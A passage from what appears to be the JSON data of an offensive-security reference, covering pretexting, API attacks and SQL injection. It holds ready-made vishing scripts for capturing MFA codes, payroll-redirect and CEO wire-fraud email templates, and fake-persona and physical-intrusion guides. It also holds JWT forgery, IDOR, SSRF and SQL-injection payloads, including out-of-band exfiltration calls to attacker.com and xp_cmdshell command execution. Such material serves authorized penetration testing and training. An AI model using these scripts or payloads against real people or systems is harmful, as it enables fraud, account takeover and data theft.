CloudFormation templates on GitHub\n# Azure tenant IDs in public app registrations\n# GCP project IDs in public GCS bucket policies\n# These enable unauthenticated enumeration of cloud resources\n```", "last_updated": "2026-03-18"}, "pretexting": {"slug": "pretexting", "title": "Pretexting", "category": "Social Engineering", "content": "# Pretexting\n\n## ◈ BEGINNER\n\n### What Is Pretexting?\n\n**Pretexting** is the creation of a fabricated scenario — a \"pretext\" — used to manipulate a target into taking an action they otherwise wouldn't. It's the foundation layer beneath almost every social engineering attack. Before you make the call, send the email, or walk through the door, you need a believable reason for why you're asking.\n\n**Why it works:** Humans are wired to be helpful, especially to authority figures and to people who seem to already have context. When someone calls and already knows your name, your manager's name, and the name of the system you're supposed to be updating, your brain categorizes them as \"insider\" — and the psychological cost of refusing feels higher than the cost of complying.\n\n**Key terms:**\n- **Pretext** — the fabricated scenario, identity, and reason for contact; the \"cover story\"\n- **Persona** — the full identity constructed for the pretext: name, title, company, backstory, phone, email, appearance\n- **Cialdini's principles** — the six psychological triggers that make social engineering work: Authority, Urgency, Social Proof, Scarcity, Liking, and Commitment/Consistency\n- **Vishing** — voice-based phishing; the phone call version of pretexting\n- **Spear phishing** — email-based pretexting targeted at a specific individual using their personal details\n- **BEC (Business Email Compromise)** — pretexting via email impersonating executives; targets financial actions like wire transfers\n- **OSINT** — Open Source Intelligence; the research phase before pretexting; provides the details that make a pretext believable\n- **Caller ID spoofing** — making a VoIP call appear to come from any phone number; used to impersonate IT helpdesk numbers\n- **Social proof** — a manipulation technique where you tell the target \"others have already done this\" to reduce resistance\n- **Commitment escalation** — getting small compliance first (verify your name) to prime the target for larger compliance (read me the OTP)\n- **Tailgating/Piggybacking** — following an authorized person through a secured door without your own credentials; the physical-world version of pretexting\n\n**What makes a pretext succeed:**\n- **Personalization** — you know their name, manager, team, and a current project\n- **Context** — the scenario matches something they're actually experiencing (a real IT rollout, a real audit, a real vendor)\n- **Authority** — you're from IT Security, Legal, or Senior Management\n- **Urgency** — there's a deadline that prevents the target from pausing to verify\n- **Comfort** — you're friendly, unhurried (paradoxically), and sound like you've done this a hundred times\n\n**Analogy:** Pretexting is like method acting for security. The best pretexters don't feel like they're lying — they inhabit the persona so completely that the target's natural suspicion-detection systems don't trigger. The FBI teaches investigators that people lie to protect themselves or gain something; someone who appears to have nothing to gain and already knows all the context \"must be legitimate.\"\n\n## ◈ INTERMEDIATE\n\nPretexting is the art of fabricating a believable scenario (pretext) to manipulate targets into divulging information, granting access, or performing actions. It is the foundation of virtually every social engineering attack.\n\n## Building a Believable Persona\n\n### Identity Components\n\nA convincing persona requires consistency across every touchpoint:\n\n| Component | Details |\n|-----------|---------|\n| Full name | Common name matching claimed ethnicity/region |\n| Job title | Realistic for claimed company/role |\n| Email | Domain-matched (fake or compromised) |\n| Phone | VoIP with spoofed caller ID |\n| LinkedIn | Aged profile with connections, endorsements |\n| Physical props | ID badge, uniform, business cards, clipboard |\n| Backstory | Consistent answers to probing questions |\n| Mannerisms | Confident, unhurried, authoritative |\n\n### Fake LinkedIn Profile Setup\n\n```\n1. Create email account (Gmail/Outlook) unlinked to real identity\n2. Use AI-generated profile photo (thispersondoesnotexist.com)\n3. Add realistic work history (plausible companies, titles, dates)\n4. Connect with 50+ people (use industry-relevant connection requests)\n5. Age the profile 30–90 days before use\n6. Add certifications, skills relevant to pretext role\n7. Join relevant LinkedIn groups for authenticity\n```\n\n---\n\n## Cialdini's Principles in Practice\n\n### Authority\n\"Hi, this is Marcus from IT Security. We've detected unusual login activity on your account and need to verify your identity immediately.\"\n\n- Use titles: \"Director of IT\", \"Security Operations\", \"Compliance Officer\"\n- Reference power figures: \"The CISO asked me to follow up on this directly\"\n- Wear uniforms, carry clipboards, use technical jargon\n\n### Urgency\n\"Your VPN access will be terminated in 30 minutes unless we can verify your credentials. I need to help you right now.\"\n\n- Creates panic, bypasses rational analysis\n- \"Urgent\", \"immediately\", \"by end of day\", \"before the audit\"\n- Combine with authority: \"Legal is waiting on this\"\n\n### Social Proof\n\"We've already updated credentials for everyone else on your floor — you're the last one we need to reach.\"\n\n- \"Your manager already completed this\"\n- \"The rest of your team has already enrolled\"\n\n### Scarcity\n\"We only have 10 minutes before the maintenance window closes and your account will be locked.\"\n\n### Liking\nBuild rapport first — use target's name, reference shared context (their team, recent company news, local sports):\n\n```\n\"Hey Sarah! I saw you were at the all-hands last week — great session, right?\nI'm calling because we're rolling out the new SSO today and wanted to make\nsure your account was ready...\"\n```\n\n### Reciprocity\nProvide something of value first, then ask:\n\"I was able to push back your ticket deadline by a week — now I just need\nyour help confirming one thing to close out this security ticket...\"\n\n---\n\n## IT Helpdesk Pretext (Phone)\n\nThe most effective and commonly used pretext in corporate environments:\n\n**Setup:**\n```bash\n# VoIP spoofing (spoof IT helpdesk number)\n# Use SIPVicious or authorized VoIP provider with caller ID control\n# Target: employee identified via LinkedIn/company directory\n# Timing: Monday morning or Friday afternoon (high stress, rushed)\n```\n\n**Script Template:**\n```\n\"Hi [Target Name], this is [Fake Name] from IT Security.\nI'm calling because our monitoring system flagged some unusual authentication\nattempts on your account overnight — looks like someone may have tried to\naccess your email from an unknown location.\n\nI just need to verify a couple things to make sure your account is secure.\nFirst, can you confirm your employee ID so I can pull up your ticket?\n[Pause — let them answer]\n\nGreat. Now, I'm going to reset your multi-factor authentication.\nYou should receive a text in about 30 seconds — can you read that code\nto me so I can confirm the reset went through?\n[OTP captured — use immediately for account access]\n\nPerfect, you're all set. I've flagged your ticket as resolved.\nIs there anything else I can help you with today?\"\n```\n\n**Handling objections:**\n- \"Can I call you back?\" → \"Absolutely — the IT Security line is [fake number that goes to voicemail you control], but this process does expire in about 15 minutes. If easier I can just do it now.\"\n- \"How do I know this is real?\" → \"Totally understand. You can verify by checking your email — I just sent you a ticket confirmation from itsupport@[company].com.\" [if you control phishing email]\n- \"I need to ask my manager\" → \"Of course — your manager [name from LinkedIn] is actually who flagged this to us. If you want I can bring them into a three-way call?\"\n\n---\n\n## Vendor / Contractor Pretext\n\n**Target:** IT staff, facilities, security guards\n\n**Setup:** Business cards with plausible company name, polo shirt, laptop bag, work order printout\n\n**Script:**\n```\n\"Hi, I'm [Name] from [Vendor] — I'm here to do the scheduled maintenance\non the UPS systems in the server room. I have a work order here...\nthe facilities team was supposed to leave my name at the front desk\nbut it looks like there might have been a mix-up.\"\n\n[Show printed (fake) work order on company letterhead]\n\n\"Is there someone I can call? My contact was [name from LinkedIn/website]\nbut she's not picking up — do you mind just buzzing me through?\nI've got three other sites after this and I really can't fall behind.\"\n```\n\n---\n\n## HR / Payroll Redirect (BEC)\n\nUsed to redirect payroll direct deposit to attacker-controlled account:\n\n**Email approach (impersonate employee):**\n```\nFrom: john.smith@corp-payroll-update.com\nTo: hr@corp.com\nSubject: Direct Deposit Change Request\n\nHi HR Team,\n\nI need to update my direct deposit information effective next pay period.\nMy new bank details are as follows:\n\nBank: Chase Bank\nRouting: 021000021\nAccount: 1234567890\nAccount Type: Checking\n\nPlease confirm once updated. I'm traveling this week so email is best.\n\nThanks,\nJohn Smith\nEmployee ID: 10452\n```\n\n---\n\n## Executive Impersonation (CEO Fraud)\n\n```\nFrom: \"David Chen - CEO\" \nTo: cfo@corp.com\nSubject: Urgent Wire Transfer - Confidential\n\nHi [CFO Name],\n\nI need you to process a wire transfer today for a confidential acquisition\nwe're finalizing. I'm in back-to-back meetings and can't call — please\ntreat this as highest priority.\n\nAmount: $247,500\nBeneficiary: Meridian Partners LLC\nBank: Wells Fargo\nRouting: 121000248\nAccount: 8834921045\nReference: Project Merlin\n\nThis is time-sensitive — please confirm once processed.\nDo not discuss with others until the deal is announced.\n\nDavid\n```\n\n---\n\n## Physical Access Pretext\n\n### Delivery Driver\n```\nProps: uniform (Amazon/FedEx/UPS purchased), package, delivery scanner app\nScript: \"Hi, I have a delivery for [common name] in [department].\n I need a signature — is there someone who can help me get this upstairs?\"\nSuccess rate: Very high — people hold doors for people carrying packages\n```\n\n### HVAC / Facilities Technician\n```\nProps: coveralls, clipboard with \"work order\", toolbox\nScript: \"I'm here from [HVAC company] for the quarterly maintenance inspection.\n I need access to the mechanical rooms on floors 3 and 5.\"\nBest for: Server rooms (need to check cooling), electrical closets (network gear)\n```\n\n---\n\n## Documentation and Planning\n\nBefore any pretext engagement, document:\n\n```markdown\n## Pretext Card (keep on person during engagement)\n\n**Persona:** Marcus Webb, IT Security Analyst\n**Employer:** TechGuard Solutions (vendor for target)\n**Phone:** +1-555-0192 (VoIP, voicemail configured)\n**Email:** m.webb@techguard-solutions.io\n**Backstory:** 3 years at TechGuard, handles security audits for 12 clients\n**Objective:** Gain badge/tailgate access to server room floor 4\n**Abort signal:** If asked for ID that requires close inspection → \"Let me grab it from my car\"\n**Emergency contact:** [Client engagement lead name and number]\n**Authorization letter:** In laptop bag — signed by [Client CISO]\n```\n\n## ◈ ADVANCED\n\n### Deep Persona Construction for Long-Term Operations\n\nFor multi-week engagements where the persona may face scrutiny:\n\n```\nPersona depth layers:\n1. Surface (survives 10-second check):\n - LinkedIn profile aged 6+ months with 50+ connections\n - Company website listing (create or compromise a real small vendor)\n - Email with correct SPF/DKIM for domain\n\n2. Medium (survives 5-minute investigation):\n - LinkedIn activity history (posts, likes, comments over time)\n - Glassdoor reviews mentioning the employer\n - Domain registration > 1 year old, website with SSL\n\n3. Deep (survives HR/security verification call):\n - Actual phone number that routes to your controlled voicemail\n - Email address that bounces realistically to corporate email system\n - LinkedIn mutual connections with target (add real employees as connections beforehand)\n - Company appears in industry directories or press releases (create these)\n - References: other personas you control who can vouch\n\nTool: ChatGPT for generating consistent backstory details across all platforms\nTool: AI face generators for profile photos (thispersondoesnotexist.com)\n```\n\n### Real-Time Operator Support During Vishing\n\nHigh-value vishing calls benefit from a two-person team:\n\n```\nRole 1: Caller (in-persona, live on phone)\nRole 2: OSINT operator (monitoring call, feeding intel in real time via text/earpiece)\n\nOSINT operator tasks during call:\n- Google target name + company as call starts → confirm role/manager\n- Look up any names target mentions → verify they're real employees\n- Check target's LinkedIn activity → recent posts to reference naturally\n- Pull any OSINT collected pre-engagement → prompt caller with details\n\nExample flow:\n Caller: \"I was coordinating with... [pauses naturally]\"\n Operator texts: \"Her manager is Tom Richardson - VP of IT\"\n Caller: \"...Tom Richardson's team on this.\"\n Target: [audible trust increase - caller knows their manager]\n```\n\n### Handling Technical Skeptics\n\nIT staff and security-conscious targets resist standard pretexts. Advanced techniques:\n\n```\n1. Technical credibility establishment:\n - Open with a specific technical detail about their environment\n (from OSINT: \"I'm seeing intermittent auth failures on your Okta tenant —\n looks like it might be related to the Azure AD conditional access policy\n you updated last Thursday\")\n - Reference specific tool versions, error codes, ticket numbers\n - Use internal jargon from their tech stack (gleaned from LinkedIn job postings)\n\n2. Flip the authority dynamic:\n - Instead of claiming authority over them, appeal to their expertise\n \"You're the only one who can fix this from your side — I just need your help\"\n - Technical targets respond better to peer-to-peer than authority pressure\n\n3. Breadcrumb method:\n - Don't ask for everything at once\n - Call 1: \"Just verifying we have the right contact for the Azure audit\"\n - Call 2: \"Following up on the ticket from Tuesday — need to verify one setting\"\n - Call 3: \"Last step for the audit — can you confirm the MFA config?\"\n - Each call builds trust and precedent; final ask feels small by comparison\n\n4. Recovery from suspicion:\n - If target gets suspicious: immediately de-escalate, don't push\n - \"No problem at all — I completely understand. I'll follow up by email instead.\"\n - This actually increases trust (a scammer would push harder)\n - Send follow-up email (from your spoofed domain) confirming the call\n```\n\n### Physical Pretexting for Server Room Access\n\nCombining persona with physical access:\n\n```\nPre-operation OSINT:\n- Building permit database: HVAC/electrical contractor names for that building\n- LinkedIn: facilities team members at target company\n- Google Maps: entrance layout, badge reader locations, reception position\n- Employee photos on LinkedIn: badge design, lanyard colors, uniform style\n\nProps and appearance:\n- Coveralls or company polo in correct color\n- Printed work order on vendor letterhead (target company's current vendor found via LinkedIn)\n- Toolbox with plausible tools for claimed work\n- Clipboard with work order, pen behind ear\n- Avoid phone in hand (suggests unfamiliarity with environment)\n\nCritical timing:\n- Arrive during shift change (busy, reduced scrutiny)\n- Monday morning works for most pretexts (people expect to see new faces)\n- Avoid Fridays (security staff is relaxed but other staff is also leaving early/distracted)\n- Food delivery pretext: 11:30 AM–12:30 PM (people are focused on lunch)\n\nAbort criteria:\n- If asked for ID requiring close inspection → \"Left it in the truck, I'll grab it\"\n- If someone starts making calls to verify → \"I'll come back when you've confirmed, no worries\"\n- Never escalate physically; leave gracefully\n```", "last_updated": "2026-03-18"}, "api-attacks": {"slug": "api-attacks", "title": "API Security Attacks", "category": "Web Attacks", "content": "# API Security Attacks\n\nAttacking REST, GraphQL, WebSocket, and gRPC APIs — authentication bypass, authorization flaws, and injection.\n\n## ◈ BEGINNER\n\n### What Are API Attacks?\n\nAn API (Application Programming Interface) is how software components talk to each other. When you use a mobile app or a single-page web application, it communicates with the backend server through an API. API attacks target the endpoints, authentication mechanisms, and data handling logic of these interfaces.\n\n### Analogy\n\nThink of an API like a restaurant waiter. You (the client) tell the waiter (API) what you want, and the waiter relays that to the kitchen (server). API attacks are like discovering that the waiter will bring you anyone's order if you just say the right table number, or that the waiter never checks whether you are actually a paying customer before serving you.\n\n### Key Terms\n\n- **REST API**: The most common API style. Uses HTTP methods (GET, POST, PUT, DELETE) and URLs to represent resources like `/api/users/123`.\n- **GraphQL**: A query language for APIs that lets clients request exactly the data they need in a single request. More flexible than REST but introduces unique attack surfaces.\n- **JWT (JSON Web Token)**: A compact, self-contained token format used for API authentication. Contains encoded claims (user identity, roles) signed by the server.\n- **BOLA / IDOR**: Broken Object-Level Authorization / Insecure Direct Object Reference. When you can access another user's data by changing an ID in the request.\n- **Rate limiting**: Controls how many requests a client can make in a given time window. Prevents brute force and abuse.\n- **WebSocket**: A persistent, full-duplex communication channel between client and server, used for real-time features like chat or live updates.\n- **gRPC**: A high-performance RPC framework using Protocol Buffers (protobuf) for serialization. Common in microservices architectures.\n\n### Why It Matters\n\nAPIs are the backbone of modern applications. Unlike traditional web apps where a browser renders server-side HTML, API-driven applications expose raw data and business logic directly. Common consequences of API vulnerabilities:\n\n- Mass data exfiltration (user records, financial data, PII)\n- Account takeover through authentication bypass\n- Privilege escalation from regular user to administrator\n- Server-Side Request Forgery (SSRF) leading to internal network access\n- Denial of service through unbounded queries or missing rate limits\n\nAPIs consistently dominate the OWASP Top 10 for API Security, and they are often the fastest path to critical findings in modern penetration tests.\n\n### First Steps for Testing\n\n1. Discover API documentation: look for `/swagger.json`, `/openapi.json`, `/api-docs`, `/graphql`.\n2. Authenticate as a low-privilege user and map every endpoint you can reach.\n3. Try accessing resources belonging to other users by changing IDs in URLs or request bodies.\n4. Test whether admin-only endpoints are actually restricted.\n5. Check if JWTs can be tampered with (change algorithm, modify claims).\n\nPractice environments: OWASP crAPI, DVGA (Damn Vulnerable GraphQL Application), Juice Shop.\n\n---\n\n## ◈ INTERMEDIATE\n\n## API Discovery & Enumeration\n\n```bash\n# Common documentation endpoints\n/swagger.json /swagger/v1/swagger.json /api-docs /openapi.json\n/v2/api-docs /graphql /graphiql /.well-known/openapi.yaml\n/api/swagger /docs /redoc\n\n# Kiterunner (API-specific path discovery)\nkr scan https://target.com -w /path/to/routes-large.kite -x 20\n\n# ffuf for endpoint fuzzing\nffuf -u https://target.com/api/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,301,302,401,403\n\n# HTTP method tampering\nfor method in GET POST PUT PATCH DELETE OPTIONS HEAD; do\n echo \"$method: $(curl -s -o /dev/null -w '%{http_code}' -X $method https://target.com/api/admin/users)\"\ndone\n```\n\n## Authentication Attacks\n\n### JWT Attacks\n\n**None algorithm**:\n```bash\n# Decode header, change \"alg\" to \"none\", remove signature\njwt_tool TOKEN -X a\n# If accepted: forge any claims without a signing key\n```\n\n**Algorithm confusion (RS256 to HS256)**:\n```bash\n# Server verifies RS256 token but also accepts HS256\n# Sign with the public key (which is known) as HMAC secret\njwt_tool TOKEN -X k -pk public.pem\n```\n\n**Weak secret brute force**:\n```bash\nhashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt\njwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt\n```\n\n**kid parameter injection**:\n```bash\n# kid: path traversal to /dev/null (empty key)\njwt_tool TOKEN -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\n\n# kid: SQL injection\njwt_tool TOKEN -I -hc kid -hv \"' UNION SELECT 'key123'--\" -S hs256 -p \"key123\"\n```\n\n**jku/x5u header injection**: Point to attacker-hosted JWK set or certificate.\n\n### API Key Disclosure\n\n```bash\n# Check JavaScript files\ngrep -rE 'api[_-]?key|apikey|api_secret' js_files/\n\n# GitHub search\n\"target.com\" API_KEY\norg:targetcorp filename:.env\n\n# Mobile app decompilation\napktool d target.apk\ngrep -rE 'api[_-]?key' target/\n```\n\n## Authorization Attacks\n\n### BOLA / IDOR\n\n```bash\n# Test sequential IDs\nGET /api/users/1001 → own data\nGET /api/users/1002 → other user's data?\n\n# UUID enumeration (leak via other endpoints)\nGET /api/users → list includes UUIDs of other users\nGET /api/users/UUID → direct object access\n\n# Parameter tampering\nGET /api/orders?user_id=victim_id\n\n# Replace ID in response\nPOST /api/transfer {\"from\": \"my_account\", \"to\": \"my_account\"}\n→ Change \"from\" to victim's account\n```\n\n### BFLA (Broken Function Level Authorization)\n\n```bash\n# Access admin endpoints as regular user\nGET /api/admin/users\nPOST /api/admin/users/create\nDELETE /api/users/1001\n\n# Method change\nGET /api/users/1001 → allowed\nPUT /api/users/1001 → should be denied but isn't?\n\n# Version/path manipulation\n/api/v1/users (enforced) → /api/v2/users (forgotten)\n/api/users → /api/Users (case sensitivity)\n```\n\n### Mass Assignment\n\n```bash\n# Add unexpected fields to requests\nPOST /api/register\n{\"username\": \"test\", \"password\": \"test\", \"role\": \"admin\"}\n{\"username\": \"test\", \"password\": \"test\", \"isAdmin\": true}\n{\"username\": \"test\", \"password\": \"test\", \"credits\": 99999}\n\n# Check by reading back the created resource\n```\n\n## Rate Limiting Bypass\n\n```bash\n# IP-based bypass via headers\nX-Forwarded-For: 127.0.0.1\nX-Real-IP: 1.2.3.4\nX-Originating-IP: 1.2.3.4\nX-Client-IP: 1.2.3.4\n\n# Parameter manipulation\n# Adding null bytes, whitespace, or encoding to make each request \"unique\"\nPOST /api/login {\"user\": \"admin\", \"pass\": \"test1\"}\nPOST /api/login {\"user\": \"admin \", \"pass\": \"test2\"} # trailing space\nPOST /api/login {\"user\": \"admin%00\", \"pass\": \"test3\"} # null byte\n\n# Distributed via proxy rotation\n```\n\n## GraphQL Attacks\n\n```graphql\n# Introspection query (discover schema)\n{\n __schema {\n types {\n name\n fields {\n name\n type { name }\n }\n }\n }\n}\n\n# Even if introspection is disabled, try field suggestion\n{ user { a } } # Error may suggest valid field names\n\n# Batching attacks (bypass rate limiting)\n[\n {\"query\": \"mutation { login(user:\\\"admin\\\",pass:\\\"pass1\\\") { token } }\"},\n {\"query\": \"mutation { login(user:\\\"admin\\\",pass:\\\"pass2\\\") { token } }\"},\n {\"query\": \"mutation { login(user:\\\"admin\\\",pass:\\\"pass3\\\") { token } }\"}\n]\n# All mutations execute in a single HTTP request\n\n# Query depth/complexity bypass\n# Deeply nested queries to cause DoS\n{ user { friends { friends { friends { friends { name } } } } } }\n\n# IDOR via node interface\n{ node(id: \"base64_encoded_id\") { ... on User { email ssn } } }\n\n# Alias-based batching\n{\n a: login(user:\"admin\", pass:\"pass1\") { token }\n b: login(user:\"admin\", pass:\"pass2\") { token }\n c: login(user:\"admin\", pass:\"pass3\") { token }\n}\n```\n\n## WebSocket Attacks\n\n```bash\n# Missing authentication on WebSocket upgrade\n# Connect to ws://target.com/ws without credentials\nwebsocat ws://target.com/ws\n\n# Cross-Site WebSocket Hijacking (CSWSH)\n# If Origin header is not validated on upgrade request:\n# Host malicious page that opens WebSocket to target\n# Uses victim's cookies for authentication\n\n# Message tampering\n# Intercept WebSocket frames in Burp Suite\n# Modify message content (JSON payloads, binary frames)\n# Inject into message handling (SQLi, command injection in WS messages)\n```\n\n## gRPC Attacks\n\n```bash\n# Server reflection (if enabled)\ngrpcurl -plaintext target:50051 list\ngrpcurl -plaintext target:50051 describe TargetService\n\n# Enumerate methods\ngrpcurl -plaintext target:50051 list TargetService\n\n# Call method\ngrpcurl -plaintext -d '{\"id\": 1}' target:50051 TargetService/GetUser\n\n# Protobuf tampering with grpcui\ngrpcui -plaintext target:50051\n# Web UI for interactive gRPC testing\n\n# Without reflection: use .proto files (reverse-engineer from client binary)\nprotoc --decode_raw < captured_grpc_message.bin\n```\n\n## SSRF via API\n\n```bash\n# Webhook/callback URL parameters\nPOST /api/webhook {\"url\": \"http://169.254.169.254/latest/meta-data/\"}\nPOST /api/import {\"source_url\": \"http://internal-service:8080/admin\"}\nPOST /api/render {\"template_url\": \"file:///etc/passwd\"}\n\n# PDF/image generation endpoints\nPOST /api/generate-pdf {\"html\": \"\"}\n```\n\n## OpSec Notes\n\n- API fuzzing generates high request volumes — rate-limit your testing\n- GraphQL introspection reveals the entire API surface — high-value first step\n- BOLA testing requires careful scope control — only test with authorized accounts\n- WebSocket connections maintain state — disconnection may trigger alerts\n- JWT cracking is offline — no risk of detection\n- Mass assignment testing may create unintended persistent changes — use test accounts\n\n---\n\n## ◈ ADVANCED\n\n### JWT Advanced Exploitation (2026)\n\n**Embedded JWK attacks**: Some libraries accept a `jwk` header parameter containing the full public key. Forge a token with your own RSA keypair embedded in the header, sign with the corresponding private key, and the server validates using the attacker-supplied key.\n\n**Cross-service JWT confusion**: In microservice architectures, a JWT issued by Service A may be accepted by Service B if both share a signing key or if Service B does not validate the `iss` (issuer) or `aud` (audience) claims. Map the trust boundaries between services and test token reuse across them.\n\n**JWT claim injection via header parameters**: Beyond `kid`, test `jku` (JWK Set URL), `x5u` (X.509 URL), and `x5c` (X.509 Certificate Chain). If the server fetches keys from a URL you control, you own the signing process entirely. In 2026, some frameworks have added allowlist validation on these URLs, but misconfiguration remains common.\n\n**Token sidejacking**: If a JWT is transmitted over an unencrypted channel even once (HTTP redirect before HTTPS, mixed content), capture and replay. Combine with HSTS bypass techniques on subdomains.\n\n### GraphQL Advanced Exploitation\n\n**Persisted query hash brute-forcing**: Applications that disable ad-hoc queries in favor of persisted queries (identified by hash) can still be attacked by brute-forcing or reverse-engineering the hash values. Extract hashes from client-side JavaScript bundles.\n\n**Subscription abuse**: GraphQL subscriptions (over WebSocket) often have weaker authorization checks than queries/mutations. Subscribe to data streams you should not have access to. Test whether subscription resolvers enforce the same authorization as their query counterparts.\n\n**Custom directive injection**: If the schema accepts custom directives in queries (misconfigured server), inject directives that alter query behavior, bypass field-level authorization, or trigger server-side debug output.\n\n**Type confusion in unions/interfaces**: When a GraphQL schema uses union types or interfaces, test whether you can request fields from a type you should not have access to by using inline fragments (`... on AdminUser { secretField }`).\n\n### gRPC and Protobuf Advanced Attacks\n\n**Protobuf unknown field persistence**: Protobuf deserializers preserve unknown fields by default. Inject extra field numbers into requests; if the server re-serializes and passes the message to another service, the unknown fields propagate, potentially triggering mass-assignment-like vulnerabilities downstream.\n\n**gRPC metadata injection**: gRPC metadata (HTTP/2 headers) can carry authentication context. Test for metadata key injection, particularly `authorization`, `x-forwarded-for`, and custom routing headers that influence backend behavior.\n\n**Binary protobuf fuzzing**: Use tools like `libprotobuf-mutator` to generate malformed protobuf messages that trigger parsing edge cases, memory corruption, or panics in server-side handlers.\n\n### API Gateway and Service Mesh Bypass\n\n**Path normalization differential**: API gateways (Kong, Envoy, AWS API Gateway) and backend services may normalize URL paths differently. `/api/admin/users` may be blocked by the gateway, but `/api/admin//users`, `/api/admin/./users`, or `/api/Admin/users` may pass through to the backend which normalizes them identically.\n\n**HTTP/2 smuggling**: gRPC runs over HTTP/2. Discrepancies between how the API gateway and backend parse HTTP/2 frames can enable request smuggling attacks that bypass authentication and authorization enforced at the gateway layer.\n\n**Service mesh sidecar bypass**: In Kubernetes environments with Istio/Linkerd, if you can reach the pod IP directly (bypassing the sidecar proxy), you bypass all mesh-level authentication (mTLS) and authorization policies. Test from compromised pods within the same network namespace.\n\n### Automated API Attack Chains\n\nModern API testing in 2026 combines multiple vulnerability classes into chains:\n\n1. **Introspection/documentation leak** reveals endpoint schema.\n2. **BOLA on a user-listing endpoint** leaks admin UUIDs.\n3. **Mass assignment on profile update** escalates to admin role.\n4. **Admin-only endpoint** exposes SSRF via webhook configuration.\n5. **SSRF** reaches cloud metadata service, yielding IAM credentials.\n6. **IAM credentials** provide access to cloud storage containing database backups.\n\nBuilding these chains programmatically and replaying them reliably is a key differentiator in 2026-era API penetration testing. Tools like Nuclei templates, custom Burp extensions, and framework-native playbook builders enable repeatable, evidence-rich exploitation.\n\n### Detection Awareness\n\nAPI security monitoring in 2026 includes: request fingerprinting (TLS JA3/JA4, HTTP/2 frame patterns), behavioral baselines per API key/user, GraphQL query complexity scoring, and real-time BOLA detection via cross-user access pattern analysis. Understanding these detection layers helps calibrate testing speed and technique selection.", "last_updated": "2026-03-18"}, "sql-injection": {"slug": "sql-injection", "title": "SQL Injection Comprehensive", "category": "Web Attacks", "content": "# SQL Injection Comprehensive\n\nDetailed reference for SQL injection detection, exploitation, and filter bypass across all major database engines.\n\n## ◈ BEGINNER\n\n### What Is SQL Injection?\n\nSQL injection (SQLi) is a vulnerability that lets an attacker interfere with the database queries an application makes. When a web application builds SQL statements by gluing user input directly into the query string, an attacker can inject their own SQL logic and make the database do things the developer never intended.\n\n### Analogy\n\nImagine a librarian who fills out request slips based on what you tell them verbally. You say \"I'd like the book called *Cats*\" and the librarian writes: `FIND BOOK WHERE TITLE = 'Cats'`. Now imagine you say: \"I'd like the book called *Cats' OR TITLE != 'nothing*\". The librarian blindly writes: `FIND BOOK WHERE TITLE = 'Cats' OR TITLE != 'nothing'` -- and hands you every book in the library. SQL injection works the same way: the application trusts your input and pastes it into a query without sanitization.\n\n### Key Terms\n\n- **SQL (Structured Query Language)**: The language databases understand for retrieving and manipulating data.\n- **Parameterized query / prepared statement**: A safe coding pattern that keeps user data separate from SQL logic, preventing injection.\n- **Error-based injection**: Triggering database errors that reveal information in the application's response.\n- **Blind injection**: Extracting data indirectly because the application does not display query results or errors.\n- **UNION injection**: Appending a second SELECT statement to the original query to pull data from other tables.\n- **WAF (Web Application Firewall)**: A security device that inspects HTTP traffic and blocks known attack patterns.\n- **ORM (Object-Relational Mapper)**: A library that generates SQL from code objects, usually safe if used properly but not immune to misuse.\n\n### Why It Matters\n\nSQL injection has been the single most impactful web vulnerability class for over two decades. It can lead to:\n\n- Complete database exfiltration (usernames, passwords, financial records)\n- Authentication bypass (logging in without valid credentials)\n- Remote code execution on the database server\n- Data destruction or ransomware-style encryption of records\n\nIt consistently appears in the OWASP Top 10 and remains one of the first things any penetration tester checks for.\n\n### First Steps for Testing\n\n1. Find any input that might reach a database query: URL parameters, form fields, cookies, HTTP headers.\n2. Submit a single quote (`'`) and observe whether the response changes or shows an error.\n3. Try `' OR '1'='1` to see if you can alter the query's boolean logic.\n4. If the application behaves differently, you likely have an injection point.\n\nSafe practice environments: DVWA, SQLi-labs, HackTheBox, PortSwigger Web Security Academy.\n\n---\n\n## ◈ INTERMEDIATE\n\n## Detection Methods\n\n**Error-based**: Inject syntax errors to confirm SQL context:\n```\n' → SQL error in response = injectable\n'' → No error = string context confirmed\n' OR '1'='1 → True condition\n' OR '1'='2 → False condition (compare responses)\n```\n\n**Boolean-blind**: Infer data from response differences:\n```\n?id=1 AND 1=1 → normal response\n?id=1 AND 1=2 → different response (shorter, different content)\n```\n\n**Time-based blind**: Infer from response delay:\n```sql\n?id=1; WAITFOR DELAY '0:0:5'-- -- MSSQL\n?id=1 AND SLEEP(5)-- -- MySQL\n?id=1; SELECT pg_sleep(5)-- -- PostgreSQL\n?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -- Oracle\n```\n\n**Out-of-band**: Exfil data via DNS or HTTP when no in-band feedback:\n```sql\n-- MSSQL\n'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+db_name()+'.attacker.com\\share'; EXEC master..xp_dirtree @q--\n-- Oracle\nSELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual\n```\n\n## Database-Specific Syntax\n\n### MySQL\n```sql\n-- Version: SELECT @@version\n-- Current DB: SELECT database()\n-- List DBs: SELECT schema_name FROM information_schema.schemata\n-- List tables: SELECT table_name FROM information_schema.tables WHERE table_schema='target_db'\n-- List columns: SELECT column_name FROM information_schema.columns WHERE table_name='users'\n-- String concat: CONCAT(a,b) or a||b (in newer versions)\n-- Comment: -- , #, /**/\n-- Stacked queries: supported with multi_query\n-- File read: LOAD_FILE('/etc/passwd')\n-- File write: SELECT '' INTO OUTFILE '/var/www/html/shell.php'\n```\n\n### MSSQL\n```sql\n-- Version: SELECT @@version\n-- Current DB: SELECT db_name()\n-- List DBs: SELECT name FROM master..sysdatabases\n-- List tables: SELECT name FROM sysobjects WHERE xtype='U'\n-- List columns: SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')\n-- Stacked queries: supported by default\n-- RCE via xp_cmdshell:\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';\n-- Linked servers:\nSELECT * FROM OPENQUERY([linked_server], 'SELECT @@version')\nEXEC ('xp_cmdshell ''whoami''') AT [linked_server]\n```\n\n### PostgreSQL\n```sql\n-- Version: SELECT version()\n-- Current DB: SELECT current_database()\n-- List DBs: SELECT datname FROM pg_database\n-- List tables: SELECT tablename FROM pg_tables WHERE schemaname='public'\n-- Stacked queries: supported\n-- File read: SELECT pg_read_file('/etc/passwd')\n-- RCE: COPY 